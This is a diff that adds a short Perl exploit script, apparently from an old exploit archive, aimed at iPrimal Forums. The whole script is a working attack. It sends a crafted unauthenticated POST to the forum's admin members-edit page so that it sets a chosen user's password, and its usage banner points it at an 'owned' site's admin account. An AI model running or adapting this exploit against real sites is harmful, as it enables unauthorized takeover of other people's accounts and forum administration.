@@ -1,0 +1,42 @@
+#!perl
+#http://ipigroup.org/downloads/forums.zip
+#Bl0od3r
+#Germany
+#shoutzz to all members of dC3 crew ,matrix_killer,eddie14
+#special to str0ke
+use IO::Socket;
+if (@ARGV<4) {
+&header;
+} else { &start };
+
+sub start() {
+$host=$ARGV[0];
+$path=$ARGV[1];
+$user=$ARGV[2];
+$passwd=$ARGV[3];
+$post="usersname=".$user."&password=".$passwd."&email=test%40test.com&name=Dummy+user&tagline=Im+a+dumy+user&location=Ohio&bday=1983-11-20&job=Being+a+test+dummy&interests=Anything&bio=I%5C%5C%5C%27ve+been+sitting+on+this+db+my+whole+life.++HELP%21&signature=This+is+my+signature.&url=http%3A%2F%2Fipigroup.org&aim=myaim&yahoo=myyahoo&msn=mymsn%40hotmail.com&icq=546546&submitupdate=Update";
+$len=length($post);
+$sock=IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$host",PeerPort=>"80")
+or die ("Error");
+print $sock "POST ".$path."admin/index.php?p=members&edit=".$user." HTTP/1.0\n";
+print $sock "Host: ".$host."\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\n";
+print $sock "Content-Length: ".$len."\n\n";
+print $sock $post;
+
+print "[+]Seems like your account has been created!Now try to login in :";
+print "\n[+]User:$user\t[+]Password:$passwd";
+}
+
+sub header() {
+print("
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+\t\t~~iPrimal Forums Users(ChangePass) 3xPl0!t~~
+\t\t[+]By Bl0od3r
+\t\t[+]dC3 Crew
+\t\t[+]Usage:script.pl owned.org /script/ admin yeesss
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+");
+}
+
+# milw0rm.com [2006-11-06]
